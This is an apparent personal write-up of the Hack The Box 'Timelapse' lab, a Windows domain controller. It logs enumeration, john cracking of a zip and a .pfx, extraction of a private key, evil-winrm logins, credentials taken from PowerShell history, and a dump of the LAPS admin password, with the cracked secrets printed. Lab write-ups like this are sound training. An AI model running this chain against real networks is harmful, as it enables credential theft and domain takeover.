```bash
nmap -sV -sC 10.129.29.228
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-02 14:49 CDT
Nmap scan report for 10.129.29.228
Host is up (0.0078s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-04-03 03:49:29Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h59m58s
| smb2-time: 
|   date: 2025-04-03T03:49:41
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```

```bash
|    Domain Information via SMB session for 10.129.29.228    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC01
NetBIOS domain name: TIMELAPSE
DNS domain: timelapse.htb
FQDN: dc01.timelapse.htb
Derived membership: domain member
Derived domain: TIMELAPSE
```

grabbed the domains! through enum4linux

first as always 

```bash
smbmap -u anonymous -p '' -H 10.129.29.228
[+] Guest session   	IP: 10.129.29.228:445	Name: timelapse.htb                                     
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Shares                                            	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
┌─[eu-dedivip-1]─[10.10.14.166]─[sm1gspl0it@htb-fw1xhk10ad]─[~]
└──╼ [★]$ smbclient //10.129.29.228/Shares 
Password for [WORKGROUP\sm1gspl0it]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 10:39:15 2021
  ..                                  D        0  Mon Oct 25 10:39:15 2021
  Dev                                 D        0  Mon Oct 25 14:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 10:48:42 2021

```

smbmap enum  and then smbclientr getting us in the shares

inside one we found a zip so we mget to our kali machine

```bash
unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 

```

Lets crack with john! First we need to turn it into a hash with zip2john

```bash
zip2john winrm_backup.zip > hash.txt
Created directory: /home/sm1gspl0it/.john
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8

```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2025-04-02 15:21) 3.333g/s 11578Kp/s 11578Kc/s 11578KC/s surkerior..superkebab
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

strings on this .pfx file shows me some interesting stuff and i learned that .pfx is “is ***password protected file certificate*** commonly used for code signing your application”

```bash
	Er
C(!,
4bz'
`o<l
|Y4W
I0{Q
L(vqQ#
{q[l"8
`+$DOC
hK*y
;5UERr
X!+3
&JCy
$-1f
NAM'u
"-r$$
Legacyy0
211025140552Z
311025141552Z0
Legacyy0
r"*J0:
cZK3
".G,
x0v0
legacyy@timelapse.htb0
}J5~f
t{(lz
5&8H
&4<6
kj@1
uUh2s

```

Something here, lets figure it out. After chatgpt i found that we can extract a cert from it using open ssl. Funnily enough another layer of protection. 

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out private.key
Enter Import Password:
Mac verify error: invalid password?
```

but in a masterclass of john the rippering, we can crack .pfx too, unreal. 

```bash
fx2john legacyy_dev_auth.pfx > hashpfx.txt
┌─[eu-dedivip-1]─[10.10.14.166]─[sm1gspl0it@htb-fw1xhk10ad]─[~]
└──╼ [★]$ john --wordlist=/usr/share/wordlists/rockyou.txt hashpfx.txt
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
***thuglegacy***       (legacyy_dev_auth.pfx)     
1g 0:00:00:30 DONE (2025-04-02 15:36) 0.03249g/s 105029p/s 105029c/s 105029C/s thuglife06..thsco04
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

thugLegacy pword

so after some further trial and error we got there and extracted a cert, lessons learned. Most things can be cracked. And .pfx files will have a cert in that can be grabbed

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out private.key -legacy
Enter Import Password:
Enter PEM pass phrase:
Error outputting keys and certificates
40D7B9DB557F0000:error:14000065:UI routines:UI_set_result_ex:result too small:../crypto/ui/ui_lib.c:888:You must type in 4 to 1024 characters
40D7B9DB557F0000:error:1400006B:UI routines:UI_process:processing error:../crypto/ui/ui_lib.c:548:while reading strings
40D7B9DB557F0000:error:0480006D:PEM routines:PEM_def_callback:problems getting password:../crypto/pem/pem_lib.c:62:
40D7B9DB557F0000:error:07880109:common libcrypto routines:do_ui_passphrase:interrupted or cancelled:../crypto/passphrase.c:184:
40D7B9DB557F0000:error:1C80009F:Provider routines:p8info_to_encp8:unable to get passphrase:../providers/implementations/encode_decode/encode_key2any.c:116:
┌─[eu-dedivip-1]─[10.10.14.166]─[sm1gspl0it@htb-fw1xhk10ad]─[~]
└──╼ [★]$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out private.key -legacy -nodes
Enter Import Password:
┌─[eu-dedivip-1]─[10.10.14.166]─[sm1gspl0it@htb-fw1xhk10ad]─[~]
└──╼ [★]$ ls
box  cacert.der  Desktop  Documents  Downloads  hashpfx.txt  hash.txt  legacyy_dev_auth.pfx  Music  my_data  Pictures  private.key  Public  Templates  Videos  winrm_backup.zip
┌─[eu-dedivip-1]─[10.10.14.166]─[sm1gspl0it@htb-fw1xhk10ad]─[~]
└──╼ [★]$ cat private.key
Bag Attributes
    Microsoft Local Key set: <No Values>
    localKeyID: 01 00 00 00 
    friendlyName: te-4a534157-c8f1-4724-8db6-ed12f25c2a9b
    Microsoft CSP Name: Microsoft Software Key Storage Provider
Key Attributes
    X509v3 Key Usage: 90 
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQClVgejYhZHHuLz
TSOtYXHOi56zSocr9om854YDu/6qHBa4Nf8xFP6INNBNlYWvAxCvKM8aQsHpv3to
pwpQ+YbRZDu1NxyhvfNNTRXjdFQV9nIiKkowOt6gG2F+9O5gVF4PAnHPm+YYPwsb
oRkYV8QOpzIi6NMZgDCJrgISWZmUHqThybFW/7POme1gs6tiN1XFoPu1zNOYaIL3
dtZaazXcLw6IpTJRPJAWGttqyFommYrJqCzCSaWu9jG0p1hKK7mk6wvBSR8QfHW2
qX9+NbLKegCt+/jAa6u2V9lu+K3MC2NaSzOoIi5HLMjnrujRoCx3v6ZXL0KPCFzD
MEqLFJHxAgMBAAECggEAc1JeYYe5IkJY6nuTtwuQ5hBc0ZHaVr/PswOKZnBqYRzW
fAatyP5ry3WLFZKFfF0W9hXw3tBRkUkOOyDIAVMKxmKzguK+BdMIMZLjAZPSUr9j
PJFizeFCB0sR5gvReT9fm/iIidaj16WhidQEPQZ6qf3U6qSbGd5f/KhyqXn1tWnL
GNdwA0ZBYBRaURBOqEIFmpHbuWZCdis20CvzsLB+Q8LClVz4UkmPX1RTFnHTxJW0
Aos+JHMBRuLw57878BCdjL6DYYhdR4kiLlxLVbyXrP+4w8dOurRgxdYQ6iyL4UmU
Ifvrqu8aUdTykJOVv6wWaw5xxH8A31nl/hWt50vEQQKBgQDYcwQvXaezwxnzu+zJ
7BtdnN6DJVthEQ+9jquVUbZWlAI/g2MKtkKkkD9rWZAK6u3LwGmDDCUrcHQBD0h7
tykwN9JTJhuXkkiS1eS3BiAumMrnKFM+wPodXi1+4wJk3YTWKPKLXo71KbLo+5NJ
2LUmvvPDyITQjsoZoGxLDZvLFwKBgQDDjA7YHQ+S3wYk+11q9M5iRR9bBXSbUZja
8LVecW5FDH4iTqWg7xq0uYnLZ01mIswiil53+5Rch5opDzFSaHeS2XNPf/Y//TnV
1+gIb3AICcTAb4bAngau5zm6VSNpYXUjThvrLv3poXezFtCWLEBKrWOxWRP4JegI
ZnD1BfmQNwKBgEJYPtgl5Nl829+Roqrh7CFti+a29KN0D1cS/BTwzusKwwWkyB7o
btTyQf4tnbE7AViKycyZVGtUNLp+bME/Cyj0c0t5SsvS0tvvJAPVpNejjc381kdN
71xBGcDi5ED2hVj/hBikCz2qYmR3eFYSTrRpo15HgC5NFjV0rrzyluZRAoGAL7s3
QF9Plt0jhdFpixr4aZpPvgsF3Ie9VOveiZAMh4Q2Ia+q1C6pCSYk0WaEyQKDa4b0
6jqZi0B6S71un5vqXAkCEYy9kf8AqAcMl0qEQSIJSaOvc8LfBMBiIe54N1fXnOeK
/ww4ZFfKfQd7oLxqcRADvp1st2yhR7OhrN1pfl8CgYEAsJNjb8LdoSZKJZc0/F/r
c2gFFK+MMnFncM752xpEtbUrtEULAKkhVMh6mAywIUWaYvpmbHDMPDIGqV7at2+X
TTu+fiiJkAr+eTa/Sg3qLEOYgU0cSgWuZI0im3abbDtGlRt2Wga0/Igw9Ewzupc8
A5ZZvI+GsHhm0Oab7PEWlRY=
-----END PRIVATE KEY-----

```

some help on the syntax 

```bash
🔹 Explanation of Flags:
-in legacyy_dev_auth.pfx → Specifies the input .pfx file.

-nocerts → Extracts only the private key (ignores certificates).

-out private.key → Saves the extracted key to a file named private.key.

-legacy → Ensures compatibility with older .pfx formats that use weaker encryption.

-nodes → Removes any passphrase from the extracted private key.
```

then we did something similar to grab the cert 

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out certificate.crt -legacy
Enter Import Password:
┌─[eu-dedivip-1]─[10.10.14.166]─[sm1gspl0it@htb-fw1xhk10ad]─[~]
└──╼ [★]$ ls

```

After a bunch of trial and error, we got in!

```bash
evil-winrm -S -i 10.129.29.228 -u Legacyy -p '' -c certificate.crt -k private.key
```

Its worth noting, that we got the legaccy user from the “strings” we ran earlier which is nice, the -S i learned has to be at the start of the syntax. I was banging by head and having it at the end! Also password blanmk works.

```bash
*Evil-WinRM* PS C:\Users\legacyy\Desktop> cat user.txt
3886961b5cba2a74622e0c6e96b44652

```

so getting in there i ran winpeas etc but naturally without a password what i shouldve thought is okay, maybe check the powershell historybut i didnt. So, i got help. But lets remember to run this everytime 

```bash
\Users\legacyy> type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit

```

```bash
evil-winrm -i 10.129.29.228 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```

In!

so i did bloodhound thru the command you can find in my bloodhound sec 

![image.png](attachment:1112fa85-f812-4797-bb68-29a00f4ca0f8:image.png)

but got this same red flag of can ps remote that doesnt do shit, i didnt waste time on this but learned a new trick from checking the guide for quick wins.

```bash
net user svc_deploy
```

This shows we are part of the LAPS which is password reader!

```bash
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 12:25:53 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.

```

The following command will leak that password of the DC!

```bash
Get-ADComputer DC01 -property 'ms-mcs-admpwd'

DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName       : dc01.timelapse.htb
Enabled           : True
ms-mcs-admpwd     : mW+43;&GJ054c644[&{[#/4%
Name              : DC01
ObjectClass       : computer
ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName    : DC01$
SID               : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName :

```

ms-mcs-admpwd     : mW+43;&GJ054c644[&{[#/4%

```bash
evil-winrm -i 10.129.29.228 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```

and root is in TRX 

summary - This box further cemented that .zips and even any password protecte file can be cracked with john! Also taught me to check groups and escalate LAPS privs and even that you can use evilwinrm with certs and keys.!!!!
